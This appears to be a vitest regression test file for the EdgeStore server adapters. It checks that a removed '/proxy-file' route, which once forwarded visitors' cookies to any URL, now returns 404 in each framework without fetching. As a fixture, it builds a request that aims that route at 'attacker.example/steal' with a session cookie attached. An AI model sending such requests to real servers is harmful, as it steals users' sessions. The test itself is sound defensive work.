import { createServer, request as httpRequest, type Server } from 'node:http';
import { type EdgeStoreRouter, type Provider } from '@edgestore/shared';
import express from 'express';
import fastify from 'fastify';
import { Hono } from 'hono';
import { type NextApiRequest, type NextApiResponse } from 'next/types';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { createEdgeStoreAstroHandler } from './astro';
import { createEdgeStoreExpressHandler } from './express';
import { createEdgeStoreFastifyHandler } from './fastify';
import { createEdgeStoreHonoHandler } from './hono';
import { createEdgeStoreNextHandler as createEdgeStoreNextAppHandler } from './next/app';
import { createEdgeStoreNextHandler as createEdgeStoreNextPagesHandler } from './next/pages';
import { createEdgeStoreRemixHandler } from './remix';
import { createEdgeStoreStartHandler } from './start';

// The removed /proxy-file route forwarded the visitor's cookies to any URL.
// Every adapter must now treat it as an unknown route without fetching.
const PROXY_PATH = `/edgestore/proxy-file?url=${encodeURIComponent(
  'https://attacker.example/steal',
)}`;
const COOKIE = 'session=secret';

const config = () => ({
  provider: {
    name: 'test-provider',
    init: vi.fn(() => ({ token: 'provider-token' })),
    getBaseUrl: vi.fn(() => 'https://files.example.com'),
    getFile: vi.fn(),
    requestUpload: vi.fn(),
    requestUploadParts: vi.fn(),
    completeMultipartUpload: vi.fn(),
    confirmUpload: vi.fn(),
    deleteFile: vi.fn(),
  } satisfies Provider,
  router: {} as EdgeStoreRouter<Record<string, never>>,
});

const webRequest = () =>
  new Request(`https://app.example.com${PROXY_PATH}`, {
    headers: { Cookie: COOKIE },
  });

async function listen(server: Server) {
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  if (!address || typeof address === 'string') {
    throw new Error('Could not determine test server address');
  }
  return `http://127.0.0.1:${address.port}`;
}

function getStatus(url: string) {
  return new Promise<number | undefined>((resolve, reject) => {
    const req = httpRequest(url, { headers: { Cookie: COOKIE } }, (res) => {
      res.resume();
      res.on('end', () => {
        resolve(res.statusCode);
      });
    });
    req.on('error', reject);
    req.end();
  });
}

let fetchMock: ReturnType<typeof vi.spyOn>;

beforeEach(() => {
  fetchMock = vi.spyOn(globalThis, 'fetch');
});

afterEach(() => {
  expect(fetchMock).not.toHaveBeenCalled();
  vi.restoreAllMocks();
});

describe('/proxy-file is not served', () => {
  it('express', async () => {
    const app = express();
    app.use('/edgestore', createEdgeStoreExpressHandler(config()));
    const server = createServer(app);
    try {
      expect(await getStatus(`${await listen(server)}${PROXY_PATH}`)).toBe(404);
    } finally {
      server.close();
    }
  });

  it('fastify', async () => {
    const app = fastify();
    app.all('/edgestore/*', createEdgeStoreFastifyHandler(config()));
    await app.listen({ host: '127.0.0.1', port: 0 });
    const address = app.server.address();
    if (!address || typeof address === 'string') throw new Error('no address');
    try {
      expect(
        await getStatus(`http://127.0.0.1:${address.port}${PROXY_PATH}`),
      ).toBe(404);
    } finally {
      await app.close();
    }
  });

  it('hono', async () => {
    const app = new Hono();
    app.all('/edgestore/*', createEdgeStoreHonoHandler(config()));
    const res = await app.request(PROXY_PATH, { headers: { Cookie: COOKIE } });
    expect(res.status).toBe(404);
  });

  it('remix', async () => {
    const res = await createEdgeStoreRemixHandler(config())({
      request: webRequest(),
    });
    expect(res.status).toBe(404);
  });

  it('astro', async () => {
    const handler = createEdgeStoreAstroHandler(config());
    const res = await handler({
      request: webRequest(),
    } as Parameters<typeof handler>[0]);
    expect(res.status).toBe(404);
  });

  it('start', async () => {
    const res = await createEdgeStoreStartHandler(config())({
      request: webRequest(),
    });
    expect(res.status).toBe(404);
  });

  it('next app', async () => {
    const handler = createEdgeStoreNextAppHandler(config());
    const res = await handler({
      cookies: { toString: () => COOKIE },
      nextUrl: new URL(`https://app.example.com${PROXY_PATH}`),
    } as Parameters<typeof handler>[0]);
    expect(res.status).toBe(404);
  });

  it('next pages', async () => {
    let status: number | undefined;
    const res = {
      status: vi.fn((code: number) => {
        status = code;
        return res;
      }),
      end: vi.fn(() => res),
      send: vi.fn(() => res),
      json: vi.fn(() => res),
      setHeader: vi.fn(() => res),
    } as unknown as NextApiResponse;
    await createEdgeStoreNextPagesHandler(config())(
      {
        cookies: {},
        headers: { cookie: COOKIE },
        query: { url: 'https://attacker.example/steal' },
        url: PROXY_PATH,
      } as unknown as NextApiRequest,
      res,
    );
    expect(status).toBe(404);
  });
});
